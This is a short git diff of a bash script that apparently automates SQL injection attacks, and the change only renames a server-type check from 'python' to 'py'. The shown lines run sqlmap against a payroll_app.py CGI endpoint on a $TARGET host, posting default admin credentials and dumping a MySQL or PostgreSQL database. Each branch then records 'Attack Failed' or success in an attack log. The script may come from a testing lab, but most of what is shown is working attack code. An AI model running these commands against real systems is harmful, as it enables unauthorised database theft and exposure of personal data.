@@ -26,7 +26,7 @@ then
 		echo "$(date)   -->    Postgresql, PHP  -->   Attack Failed" >> ~/attack-log.txt
 	fi
 	rm ~/users.csv
-elif [[ ($DATABASE == "mysql") && ($SERVER == "python") ]]
+elif [[ ($DATABASE == "mysql") && ($SERVER == "py") ]]
 then
 	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=MySQL --dump 
 	FILE=~/users.csv
@@ -38,7 +38,7 @@ then
 		echo "$(date)   -->    MySQL, Python  -->   Attack Failed" >> ~/attack-log.txt
 	fi
 	rm ~/users.csv
-elif [[ ($DATABASE == "postgresql") && ($SERVER == "python") ]]
+elif [[ ($DATABASE == "postgresql") && ($SERVER == "py") ]]
 then
 	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=postgresql --dump 
 	FILE=~/users.csv
